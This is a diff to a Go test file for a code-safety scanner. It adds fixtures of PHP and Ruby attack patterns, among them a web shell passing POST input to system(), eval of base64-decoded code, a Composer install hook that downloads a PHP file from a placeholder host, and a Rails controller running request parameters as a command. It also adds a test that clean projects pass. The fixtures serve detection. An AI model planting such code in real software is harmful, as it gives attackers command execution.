@@ -165,3 +165,55 @@ func TestTestsAndCISoftened(t *testing.T) {
 		t.Errorf("score %d; findings outside runtime code should cost little", r.Score)
 	}
 }
+
+func TestPHPAndRubyAttacks(t *testing.T) {
+	dir := t.TempDir()
+	write(t, dir, map[string]string{
+		"shell.php":                         "<?php\nif (isset($_POST['c'])) { system($_POST['c']); }\n",
+		"loader.php":                        "<?php @eval(base64_decode('ZWNobyAxOw==')); ?>\n",
+		"old.php":                           "<?php echo preg_replace('/(.*)/e', 'strtoupper(\"\\\\1\")', $s);\n",
+		"composer.json":                     `{"name":"x/y","scripts":{"post-install-cmd":["php -r \"copy('https://x.example/p.php','p.php');\""]}}`,
+		"boot.rb":                           "require 'base64'\neval(Base64.decode64('cHV0cyAx'))\n",
+		"app/controllers/run_controller.rb": "class RunController < ApplicationController\n  def create\n    system(params[:cmd])\n  end\nend\n",
+		"Gemfile":                           "source 'http://rubygems.example'\ngem 'rails'\ngem 'helper', git: 'https://x.example/helper.git'\n",
+		"evil.gemspec":                      "Gem::Specification.new do |s|\n  s.name = 'evil'\n  s.extensions = ['ext/extconf.rb']\nend\n",
+	})
+	r, err := Scan(context.Background(), dir, DefaultLimits)
+	if err != nil {
+		t.Fatal(err)
+	}
+	found := rulesFound(r)
+	for _, id := range []string{"safety.php-request-exec", "safety.php-eval-decoded", "safety.php-preg-eval", "safety.composer-install-script",
+		"safety.ruby-eval-fetched", "safety.ruby-params-exec", "safety.gem-insecure-source", "safety.url-dependency", "safety.gem-native-extension"} {
+		if !found[id] {
+			t.Errorf("missing %s", id)
+		}
+	}
+	if r.Verdict != HighRisk {
+		t.Errorf("verdict %s, want high risk", r.Verdict)
+	}
+}
+
+// A standard Laravel or Rails project raises nothing worth a review: their own
+// Composer scripts are a note, and ordinary code is not a web shell.
+func TestCleanPHPAndRubyProjects(t *testing.T) {
+	dir := t.TempDir()
+	write(t, dir, map[string]string{
+		"composer.json": `{"name":"laravel/laravel","scripts":{` +
+			`"post-autoload-dump":["Illuminate\\Foundation\\ComposerScripts::postAutoloadDump","@php artisan package:discover --ansi"],` +
+			`"post-update-cmd":["@php artisan vendor:publish --tag=laravel-assets --ansi --force"],` +
+			`"post-root-package-install":["@php -r \"file_exists('.env') || copy('.env.example', '.env');\""]}}`,
+		"app/Http/Controllers/PostController.php": "<?php\n\nnamespace App\\Http\\Controllers;\n\nclass PostController extends Controller\n{\n" +
+			"    public function show(string $id)\n    {\n        return view('post', ['post' => Post::findOrFail($id), 'q' => $_GET['q'] ?? '']);\n    }\n}\n",
+		"Gemfile":               "source 'https://rubygems.org'\n\ngem 'rails', '~> 8.0'\ngem 'pg'\n",
+		"app/models/post.rb":    "class Post < ApplicationRecord\n  validates :title, presence: true\n  def summary = body.truncate(80)\nend\n",
+		"lib/tasks/report.rake": "task report: :environment do\n  system('bin/rails', 'stats')\nend\n",
+	})
+	r, err := Scan(context.Background(), dir, DefaultLimits)
+	if err != nil {
+		t.Fatal(err)
+	}
+	if r.Verdict != NoIndicators {
+		t.Errorf("clean projects: %s %+v", r.Verdict, r.Findings)
+	}
+}
